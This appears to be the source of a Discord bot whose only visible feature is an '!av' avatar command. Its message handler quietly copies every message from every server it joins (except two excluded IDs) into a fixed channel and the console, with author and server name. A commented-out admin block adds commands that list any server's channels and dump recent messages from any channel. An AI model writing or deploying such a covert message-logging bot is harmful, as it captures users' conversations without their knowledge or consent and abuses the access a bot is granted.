const Discord = require("discord.js");
require("dotenv/config");

const { Client, IntentsBitField } = require('discord.js');

const client = new Client({
  intents: [
    IntentsBitField.Flags.Guilds,
    IntentsBitField.Flags.GuildMessages,
    IntentsBitField.Flags.MessageContent,
  ],
  });

const PREFIX = "!";

// Startup
client.on("ready", async () => {
  console.log(`Logged in as ${client.user.tag}!`);

  client.guilds.cache.forEach((guild) => {
    console.log(`${guild.name} | ${guild.id}`);
  });

  console.log("\n");
});

// Message Reading
client.on("messageCreate", async (message) => {
  const sendChannelId = "1104475423376683149";
  const forbiddenServerIds = ["823579499639341096", "1104458105426817065"];

  const channel = await client.channels.fetch(sendChannelId);
  if (
    channel &&
    message.author.id !== client.user.id &&
    !forbiddenServerIds.includes(message.guild.id)
  ) {
    console.log(
      `${message.author.username}: ${message.content} (sent in ${message.guild.name})`
    );
    channel.send(
      `${message.author.username}: ${message.content} (sent in ${message.guild.name})`
    );
  }

  // Command Reading
  if (message.content.startsWith(PREFIX)) {
    const args = message.content.slice(PREFIX.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    // User avatar command
    if (command === "av") {
      let user = message.author;
      const mention = message.mentions.users.first();
      if (mention) {
        user = mention;
      } else {
        const userId = args[0];
        if (userId) {
          user = await client.users.fetch(userId);
        }
      }

      const avatarUrl = user.displayAvatarURL({
        format: "png",
        dynamic: true,
        size: 1024,
      });
      await message.reply({ files: [avatarUrl] });
    }
  }

  /* ADMIN COMMANDS

  // Channel Listing
  if (message.content.startsWith('!list-channels')) {
    const serverId = message.content.split(' ')[1];
    const server = client.guilds.cache.get(serverId);

    if (!server) {
      return message.reply('Invalid server id!');
    }


    // Send server pfp
    const pfpUrl = server.iconURL();
    if (pfpUrl) {
      await message.channel.send({ files: [pfpUrl] });
    } else {
      await message.channel.send('This server does not have a profile picture.');
    }

    const channels = server.channels.cache;
    const threads = channels.filter(channel => channel.isThread());

    const channelsList = channels
      .filter(channel => !channel.isThread())
      .map(channel => `#${channel.name} (${channel.id})`)
      .join(', ');

    const threadsList = threads
      .map(thread => `#${thread.name} (${thread.id})`)
      .join(', ');

    console.log(`Channels in ${server.name}: ${channelsList}`);
    console.log(`Threads in ${server.name}: ${threadsList}`);
  }

    // Message Listing
  const messageAmount = 50;
  if (message.content.startsWith('!list-messages')) {
    const channelId = message.content.split(' ')[1];
    const channel = client.channels.cache.get(channelId);
  
    if (!channel) {
      return message.reply('Invalid channel id!');
    }
  
    let messages = await channel.messages.fetch({ limit: Math.min(messageAmount, 100) });
    let totalFetched = messages.size;
  
    while (totalFetched < messageAmount) {
      const lastMessageId = messages.last().id;
      const remaining = messageAmount - totalFetched;
      const toFetch = Math.min(remaining, 100);
      const moreMessages = await channel.messages.fetch({ limit: toFetch, before: lastMessageId });
      if (moreMessages.size === 0) {
        break;
      }
      messages = messages.concat(moreMessages);
      totalFetched += moreMessages.size;
    }
  
    messages.forEach(message => {
      console.log(`${message.author.username}: ${message.content}`);
    });
  }
  */
});

client.login(process.env.TOKEN);